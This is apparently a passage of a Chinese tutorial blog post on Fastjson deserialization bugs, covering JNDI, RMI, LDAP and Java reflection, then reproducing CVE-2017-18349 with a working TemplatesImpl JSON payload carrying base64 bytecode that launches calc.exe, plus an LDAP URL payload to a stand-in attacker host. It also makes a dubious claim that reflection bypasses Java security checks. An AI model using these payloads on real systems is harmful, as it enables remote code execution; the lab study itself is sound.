<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Person user=new Person();</span><br><span class="line">        user.setName(&quot;rev1ve&quot;);</span><br><span class="line">        user.setAge(18);</span><br><span class="line">        String s1=JSON.toJSONString(user,SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240323231657962.png"></p>
<p>与前面代码对比，可以发现其实就是在调用<code>toJSONString</code>方法的时候，参数里面多了一个<code>SerializerFeature.WriteClassName</code>方法。传入<code>SerializerFeature.WriteClassName</code>可以使得<code>Fastjson</code>支持自省，开启自省后序列化成<code>JSON</code>的数据就会多一个<code>@type</code>，这个是代表对象类型的<code>JSON</code>文本。<code>FastJson</code>的漏洞就是他的这一个功能去产生的在对该<code>JSON</code>数据进行反序列化的时候，会去调用指定类中对于的<code>get/set/is</code>方法， 后面会详细分析</p>
<p>然后我们可以通过以下三种方式来反序列化<code>json</code>字符串了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// 方法一（返回JSONObject对象）：</span><br><span class="line">Person user = new Person();</span><br><span class="line">user.setAge(18);</span><br><span class="line">user.setName(&quot;rev1ve&quot;);</span><br><span class="line">String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">JSONObject jsonObject = JSON.parse(s1);</span><br><span class="line">System.out.println(jsonObject);</span><br><span class="line"></span><br><span class="line">// 方法二：</span><br><span class="line">Person user = new Person();</span><br><span class="line">user.setAge(18);</span><br><span class="line">user.setName(&quot;rev1ve&quot;);</span><br><span class="line">String s = JSON.toJSONString(user);</span><br><span class="line">Person user1 = JSON.parseObject(s, Person.class);  //反序列化转化为目标类型Person类</span><br><span class="line">System.out.println(user1);</span><br><span class="line"></span><br><span class="line">// 方法三：</span><br><span class="line">Person user = new Person();</span><br><span class="line">user.setAge(18);</span><br><span class="line">user.setName(&quot;rev1ve&quot;);</span><br><span class="line">String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">Person user1 = JSON.parseObject(s1,Person.class);</span><br><span class="line">System.out.println(user1);</span><br></pre></td></tr></table></figure>

<p>执行结果均为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person&#123;name=rev1ve, age=18&#125;</span><br></pre></td></tr></table></figure>



<h3 id="JNDI是什么"><a href="#JNDI是什么" class="headerlink" title="JNDI是什么"></a>JNDI是什么</h3><blockquote>
<p><code>JNDI</code>是<code>Java</code>平台的一种<code>API</code>，它提供了访问各种命名和目录服务的统一方式。<code>JNDI</code>通常用于在<code>JavaEE</code>应用程序中查找和访问资源，如<code>JDBC</code>数据源、<code>JMS</code>连接工厂和队列等。</p>
</blockquote>
<h3 id="RMI是什么"><a href="#RMI是什么" class="headerlink" title="RMI是什么"></a>RMI是什么</h3><blockquote>
<p><code>RMI</code>指的是远程方法调用（<code>Remote Method Invocation</code>），是<code>Java</code>平台提供的一种机制，可以实现在不同<code>Java</code>虚拟机之间进行方法调用。</p>
</blockquote>
<p>我们直接看下面使用了<code>RMI</code>的<code>demo</code>代码，包括一个服务器端和一个客户端。这个<code>demo</code>实现了一个简单的计算器程序，客户端通过<code>RMI</code>调用服务器端的方法进行加、减、乘、除四则运算。</p>
<p>Calculator.java(计算机接口)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface Calculator extends Remote &#123;</span><br><span class="line">    public int add(int a,int b) throws RemoteException;</span><br><span class="line">    public int subtract(int a,int b) throws RemoteException;</span><br><span class="line">    public int multiply(int a,int b) throws RemoteException;</span><br><span class="line">    public int divide(int a,int b) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>public interface Calculator extends Remote</code>表示此接口是远程接口，提供加减乘除的运算操作</p>
<p>Server.java(服务端)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;//作用是导出远程对象</span><br><span class="line"></span><br><span class="line">public class Server extends UnicastRemoteObject implements Calculator &#123;</span><br><span class="line">    public Server() throws RemoteException&#123;&#125;</span><br><span class="line">    public int add(int x, int y) throws RemoteException &#123;</span><br><span class="line">        return x + y;</span><br><span class="line">    &#125;</span><br><span class="line">    public int subtract(int a, int b) throws RemoteException &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    public int multiply(int a, int b) throws RemoteException &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    public int divide(int a, int b) throws RemoteException &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Server obj=new Server();</span><br><span class="line">            //在端口号1028上创建RMI注册表</span><br><span class="line">            LocateRegistry.createRegistry(1028);</span><br><span class="line">            //获取指定1028端口上的RMI注册表实例的代码</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1028);</span><br><span class="line">            //将远程对象Calculator绑定到RMI注册表的代码</span><br><span class="line">            registry.bind(&quot;Calculator&quot;, obj);</span><br><span class="line">            System.out.println(&quot;Server ready&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.err.println(&quot;Server exception: &quot; + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Client.java(客户端)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class Client &#123;</span><br><span class="line">    private Client()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //获取localhost指定1028端口上的RMI注册表实例的代码</span><br><span class="line">            Registry registry=LocateRegistry.getRegistry(&quot;localhost&quot;,1028);</span><br><span class="line">            //寻找registry的远程对象Calculator</span><br><span class="line">            Calculator calc=(Calculator) registry.lookup(&quot;Calculator&quot;);</span><br><span class="line">            //调用远程方法</span><br><span class="line">            int result=calc.add(5,7);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;Result:&quot;+result);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.err.println(&quot;Client exception: &quot; + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo执行过程如下</p>
<p>创建RMI注册表，然后将远程对象Calculator绑定，运行代码启动服务</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324220432233.png"></p>
<p>然后在客户端运行代码成功执行运算过程</p>
<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20240324220536033.png" alt="image-20240324220536033"></p>
<h3 id="LDAP是什么"><a href="#LDAP是什么" class="headerlink" title="LDAP是什么"></a>LDAP是什么</h3><blockquote>
<p><code>LDAP</code>是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。在<code>Java</code>安全中，<code>LDAP</code>通常用于集成应用程序与企业目录服务（例如<code>Microsoft Active Directory</code>或<code>OpenLDAP</code>）的认证和授权功能。</p>
</blockquote>
<p>我们通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用</p>
<p>假设有一个名为”<code>example.com</code>“的公司，需要存储和管理员工信息。他们使用<code>LDAP</code>作为员工信息的目录服务，每个员工都在<code>LDAP</code>中有一个唯一的标识符（<code>DN</code>），举个例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DN: uid=john,ou=People,dc=example,dc=com</span><br><span class="line">cn: John Doe</span><br><span class="line">sn: Doe</span><br><span class="line">givenName: John</span><br><span class="line">uid: john</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br><span class="line"></span><br><span class="line">DN: uid=alice,ou=People,dc=example,dc=com</span><br><span class="line">cn: Alice Smith</span><br><span class="line">sn: Smith</span><br><span class="line">givenName: Alice</span><br><span class="line">uid: alice</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br></pre></td></tr></table></figure>

<p>上图两位员工的DN由四个RDN（与DN相对区分）组成，分别是<code>uid=john,ou=People,dc=example,dc=com</code></p>
<p>可以使用LDAP查询语句来检索员工信息，例如<code>(&amp;(objectClass=person)(uid=john))</code>。</p>
<blockquote>
<p>&amp;表示AND操作符，实现多个查询条件，这里表示查找所有<code>objectClass</code>为<code>person</code>，且<code>uid</code>为<code>john</code>的员工信息</p>
</blockquote>
<p>而在<code>Fastjson</code>漏洞中，攻击者可以通过构造特定的<code>LDAP</code>查询语句，来执行任意代码或获取敏感信息。</p>
<p>例如下面JSON字符串包含恶意构造<code>LDAP url</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;value&quot;:&quot;ldap://hackvps.com/exp&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>当<code>Fastjson</code>解析该<code>JSON</code>字符串时，会触发<code>LDAP</code>查询操作，查询<code>hackervps.com</code>上的<code>LDAP</code>服务，并执行名为“<code>exp</code>”的操作。这就是<code>Fastjson</code>漏洞的成因之一。</p>
<h3 id="java反射是什么"><a href="#java反射是什么" class="headerlink" title="java反射是什么"></a>java反射是什么</h3><p>我们通过下面demo来进行理解</p>
<p>如果我们不用反射的话，我们写的代码会是下面这样</p>
<p>Person.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void sayHello() &#123;</span><br><span class="line">        System.out.println(&quot;Hello, my name is &quot; + name + &quot;, I&#x27;m &quot; + age + &quot; years old.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Person&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, age=&quot; + age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Person person=new Person(&quot;张三&quot;,20);</span><br><span class="line">        person.sayHello();</span><br><span class="line">        person.setAge(18);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324223414057.png"></p>
<p>可以看到，我们一开始设置人的名字为张三，年龄为<code>20</code>，然后我们通过<code>setAge</code>方法来修改<code>Person</code>的<code>Age</code>属性，把年龄改成<code>18</code>。<br> 但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到<code>Java</code>反射技术。我们可以修改上面的<code>Main.java</code>为如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取Person类的Class对象</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;org.example.Person&quot;);</span><br><span class="line"></span><br><span class="line">        // 先获取构造函数，然后创建Person对象</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, int.class);</span><br><span class="line">        Object person = constructor.newInstance(&quot;张三&quot;, 20);</span><br><span class="line"></span><br><span class="line">        // 调用Person对象的sayHello方法</span><br><span class="line">        Method method = clazz.getMethod(&quot;sayHello&quot;);</span><br><span class="line">        method.invoke(person);</span><br><span class="line"></span><br><span class="line">        // 绕过私有字段的访问限制，修改Person对象的age属性</span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;age&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(person, 18);</span><br><span class="line"></span><br><span class="line">        // 输出修改后的Person对象信息</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="与漏洞的联系"><a href="#与漏洞的联系" class="headerlink" title="与漏洞的联系"></a>与漏洞的联系</h4><p>为什么要用到反射，而不是直接调用<code>java.lang.runtime</code>来执行命令？</p>
<p>比如下面弹计算器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;calc.exe&quot;).getInputStream(), &quot;UTF-8&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要运行上述代码，需要在maven中引入如下依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.11.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>添加完记得点击右侧的maven重新加载</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324225014432.png"></p>
<p>这样就成功弹出计算器</p>
<p>可是既然这么做可以执行命令，为什么还要搞反射呢？</p>
<blockquote>
<p>原来Java安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取Java的安全权限。如果代码没有通过安全检测，就无法执行危险操作。而反射机制可以绕过Java安全机制的限制，从而执行危险操作。</p>
</blockquote>
<p>我们以环境java8为例，demo如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    	//加载java.lang.Runtime类</span><br><span class="line">        Class&lt;?&gt; runtimeClass=Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        //获取该类的exec方法并且接受String参数</span><br><span class="line">        Method execMethod=runtimeClass.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">        //通过反射调用方法，执行系统命令并返回一个Process对象</span><br><span class="line">        Process process=(Process) execMethod.invoke(Runtime.getRuntime(),&quot;calc.exe&quot;);</span><br><span class="line">        //下面两行将进程的标准输出流转换为更方便读取的字符流形式</span><br><span class="line">        InputStream in=process.getInputStream();</span><br><span class="line">        BufferedReader reader=new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String line;</span><br><span class="line">        //使用BufferedReader进行逐行读取</span><br><span class="line">        while((line=reader.readLine())!=null)&#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324231104393.png"></p>
<h2 id="漏洞学习"><a href="#漏洞学习" class="headerlink" title="漏洞学习"></a>漏洞学习</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）"></a>fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）</h3><p>（学习TemplatesImpl链的相关知识）</p>
<p>我们导入<code>Fastjson1.2.23</code>并自动下载相关依赖</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326125553114.png"></p>
<p>然后写入如下代码至Main.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        String text = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEAEG9yZy9leGFtcGxlL1Rlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAADAAEAA0ADQAOAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAXAAgAGAAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==\n\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行代码成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326125730090.png"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>上面json字符串test的<code>_bytecodes</code>内容是下面内容编译成<code>.class</code>文件再base64加密后的结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import 